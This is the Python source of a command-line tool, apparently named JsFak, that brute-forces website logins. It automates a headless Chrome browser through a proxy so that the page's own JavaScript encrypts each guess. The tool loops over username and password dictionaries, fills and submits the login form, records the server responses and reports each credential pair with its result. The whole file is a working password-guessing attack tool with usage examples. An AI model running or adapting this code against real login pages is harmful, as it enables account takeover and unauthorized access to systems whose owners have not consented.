# -*- coding: utf-8 -*-
import os
import argparse
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from browsermobproxy import Server
from selenium.webdriver.chrome.options import Options

class Brower_scan():
    def __init__(self):
        self.response_result = []
        self.result={}
        self.args = self.init__args()
        self.init_browsermobproxy()
        self.init_chrome()
        self.init_dict_list()
        self.result_handing()
        self.end_env()
    def init__args(self):
        print("""
                         ____. ____________________             __                 
                        |    |/   _____/\    _____/____ _______|  |  ___
                        |    |\_____  \  |    __) \__  \\\\_   __|  | /  /
                        |    |  ____|  | |    |    /    \ | |  |  |/  /
                    /\__|    |/        | |    |   /  __  \| |  |  |   \   
                    \________/_______  / |__  /  (____   /__|  |__|_  _\   
                                     \/      \/        \/           \/        
            
    Author:0xAXSDD By Gamma安全实验室
    version:1.0
    explain:这是一款用户绕过前端js加密进行密码爆破的工具，你无需在意js加密的细节，只需要输入你想要爆破url，已经username输入框的classname，password输入框的classname，点击登录框classname,爆破用户名，密码字典等就可，暂时不支持带验证码校验的爆破
    例子：
    只爆破密码：python JsFak.py -u url -user admin -Pd password.txt -cu user_classname -cp pass_classname -l login_classname
    爆破密码和用户：python main.py -ud username.txt -pd password.txt -cu user_classname -cp user_classname -l user_classname -u url
    详情功能参考  -h
        
    注意：如果遇到的classname  带空格  请用""括起来 Sever服务默认的是8080端口，如果需要修改，直接点Sever类修改，并指定参数-p
                """)
        parser = argparse.ArgumentParser(description='Use your browser to automatically call JS encryption to encrypt your payload')
        parser.add_argument("-u", "--url", metavar='url',required=True, help="Js encryption is required url")
        parser.add_argument("-cu", "--class-user", metavar='class_user',required=True,help="The class name of the Username tag.")
        parser.add_argument("-cp", "--class-passwd", metavar='class_passwd',required=True,help="The class name of the Password tag.")
        parser.add_argument("-l", "--class-login", metavar='class_login', required=True,
                            help="The class name of the Password tag.")
        parser.add_argument("-ud", "--Username-dict", metavar='Username_dict',help="Username dict file")
        parser.add_argument("-pd", "--Password-dict", metavar='Password_dict',required=True,help="Password dict file")
        parser.add_argument("-user", "--username",metavar='username', help="username")
        parser.add_argument("-f", "--out-file", metavar='out_file', help="out - file name")
        parser.add_argument("-p","--port",metavar="port",help="designated port")
        return parser.parse_args()
    def init_dict_list(self):
        print("------------------------------------开始扫描！--------------------------------------\n")
        if self.args.Username_dict!=None:
            with open(self.args.Username_dict,"r") as f_u:
                self.username_list = f_u.readlines()
                for username in self.username_list:
                    with open(self.args.Password_dict,"r") as f:
                        self.password_list = f.readlines()
                        for password in self.password_list:
                            self.fill_out_a_form(username.replace('\n',''),password.replace('\n',''))
        else:
            with open(self.args.Password_dict, "r") as f:
                self.password_list = f.readlines()
                for password in self.password_list:
                    self.fill_out_a_form(self.args.username, password.replace('\n', ''))
        self.wget_response()
    def init_browsermobproxy(self):
        try:
            self.server = Server("browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat")
        except Exception as e:
            print("browsermob-proxy 服务启动失败！请查看输入路径是否正确，或者端口是否被占用！\n")
            return 0
        self.server.start()
        self.proxy = self.server.create_proxy()
        self.chrome_options = Options()
        self.chrome_options.add_argument('--proxy-server={0}'.format(self.proxy.proxy))
        self.chrome_options.add_argument('--headless')
    def init_chrome(self):
        try:
            self.chrome = webdriver.Chrome(chrome_options=self.chrome_options)
            self.proxy.new_har("ht_list2", options={'captureContent': True})
            self.chrome.get(self.args.url)
        except Exception as e:
            print("Chrome浏览器启动失败！请检查是否安装了chrome浏览器\n")
            return 0

    def fill_out_a_form(self,username,password):
        try:
            self.chrome.find_element_by_css_selector("[class='{0}']".format(self.args.class_user)).clear()
            self.chrome.find_element_by_css_selector("[class='{0}']".format(str(self.args.class_user))).send_keys(username)
            self.chrome.find_element_by_css_selector("[class='{0}']".format(self.args.class_passwd)).clear()
            self.chrome.find_element_by_css_selector(
                "[class='{0}']".format(str(self.args.class_passwd))).send_keys(password)
            self.chrome.find_element_by_css_selector("[class='{0}']".format(self.args.class_login)).send_keys(Keys.RETURN)
        except Exception as e:
            print("Please check that the className entered is correct!\n")
            return 0
    def wget_response(self):
        result = self.proxy.har
        for entry in result['log']['entries']:
            _url = entry['request']['url']
            if "password" in _url and "username" in _url:
                _response = entry['response']
                _content = _response['content']
                # 获取接口返回内容
                self.response_result.append(_response['content']['text'])
        self.result = dict(zip(self.password_list, self.response_result))

    def result_handing(self):
        if self.args.Username_dict!=None:
            for username in self.username_list:
                for key, value in self.result.items():
                    if self.args.out_file !=None:
                        with open(self.args.out_file,"a",encoding="utf-8") as f:
                            f.writelines("账号：{user}密码：{key} :结果：{result}".format(user=username,key=key,result=value))
                    else:
                        print("账号：{user}密码：{key} :结果：{result}".format(user=username,key=key,result=value))

        else:
            for key, value in self.result.items():
                if self.args.out_file != None:
                    with open(self.args.out_file, "a",encoding="utf-8") as f:
                        f.writelines("账号：{user}密码：{key} :结果：{result}".format(user=self.args.username, key=key, result=value))
                else:
                    print("账号：{user}密码：{key} :结果：{result}".format(user=self.args.username,key=key,result=value))

    def end_env(self):
        try:
            self.server.stop()
            self.chrome.quit()
            if self.args.port == None:
                self.args.port = 8080
            print(self.args.port)
            find_netstat = os.popen("netstat -ano | findstr {port}".format(port = self.args.port))
            pid = find_netstat.read().split()[4]
            kail_pid = os.popen("taskkill /F /PID {PID}".format(PID=pid))
            print(kail_pid.read())
            return 1
        except IndexError as e:
            return 0

if __name__ == '__main__':
    brower = Brower_scan()